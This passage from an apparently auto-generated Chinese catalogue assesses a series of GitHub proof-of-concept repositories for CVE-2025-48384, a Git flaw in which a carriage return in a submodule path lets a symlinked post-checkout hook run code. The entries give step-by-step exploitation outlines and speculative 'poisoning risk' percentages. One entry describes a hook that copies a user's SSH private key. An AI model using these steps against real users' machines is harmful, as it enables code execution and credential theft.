3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，允许攻击者通过构造特殊的 Git 配置文件，在受害者克隆或初始化子模块时执行任意代码。漏洞的根源在于 Git 对配置项中尾部回车符（CR）处理不当。当 Git 读取配置值时，会删除尾部的 CRLF，但写入时，如果值以 CR 结尾，则不会进行引号处理，导致 CR 在后续读取时丢失。如果子模块路径包含尾部 CR，这会导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的 POC 代码 `/tmp/4ddcea7dd1399c323a9fb7a8b3071e04/README.md` 本身并不能直接验证漏洞，它只是一个简单的说明文件。真正的 POC 应该包含能够触发漏洞的恶意 Git 仓库配置和子模块结构。从搜索结果来看，存在可用的 POC。

**投毒风险：**

提供的 README.md 文件本身不包含任何可执行代码，因此直接的投毒风险较低。但是，如果该仓库中存在其他文件（例如恶意的 `.gitmodules` 文件或者钩子脚本），则存在投毒的风险。假设仓库作者在其他文件中隐藏了恶意代码的可能性存在，估计投毒风险为 10%。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含特殊构造的 `.gitmodules` 文件和恶意的子模块钩子脚本的 Git 仓库。
2.  **.gitmodules 构造：**  `.gitmodules` 文件中的子模块路径包含尾部回车符（CR），例如 `path = submodule_path\r`。
3.  **符号链接：** 创建一个符号链接，将 `submodule_path` 指向 `.git/modules/<submodule_name>/hooks`。
4.  **恶意钩子：** 子模块中包含一个 `post-checkout` 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户：** 攻击者诱骗受害者克隆该恶意仓库并初始化子模块（使用 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`）。
6.  **触发漏洞：** 当 Git 初始化子模块时，由于路径中的回车符被错误处理，子模块会被检出到错误的位置。由于存在符号链接，`post-checkout` 钩子会被执行，从而导致任意代码执行。

**项目地址:** [eliox01/CVE-2025-48384](https://github.com/eliox01/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384-Git配置注入与任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库或者提交包含恶意配置的patch

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，没有正确处理回车符 \r，导致在特定情况下（如初始化包含子模块的仓库时），子模块路径被错误解析。攻击者可以利用这一点，通过在子模块路径中注入恶意字符，配合精心构造的符号链接，将子模块检出到非预期位置，例如 Git 钩子目录。如果子模块包含恶意的 post-checkout 钩子脚本，则在检出后会被执行，从而实现任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，此漏洞的利用需要满足一定条件，即需要用户 clone 包含恶意子模块配置的仓库或者提交包含恶意配置的patch。提供的 POC 代码 `/tmp/8746716955bead91920f029f2728e38d/README.md` 仅仅是一个 README 文件，本身不具备任何攻击性，因此不能直接作为有效的 POC。

**投毒风险评估：**
提供的 POC 代码只是一个简单的 README 文件，没有任何可执行代码，因此不存在直接的投毒风险。投毒行为可能存在于更复杂的攻击场景中，比如在精心构造的恶意 Git 仓库中，但仅凭这个 README 文件无法评估其风险。

**利用方式：**
1.  攻击者创建一个包含恶意子模块配置的 Git 仓库，子模块的路径包含回车符 \r。
2.  攻击者创建一个符号链接，将修改后的子模块路径指向 Git 钩子目录（.git/hooks）。
3.  攻击者在子模块中包含一个恶意的 post-checkout 钩子脚本。
4.  受害者 clone 该恶意仓库，Git 初始化子模块时，由于回车符处理不当，子模块被检出到错误的钩子目录。
5.  检出完成后，恶意的 post-checkout 钩子脚本被执行，攻击者从而实现任意代码执行。

**项目地址:** [elprogramadorgt/CVE-2025-48384](https://github.com/elprogramadorgt/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
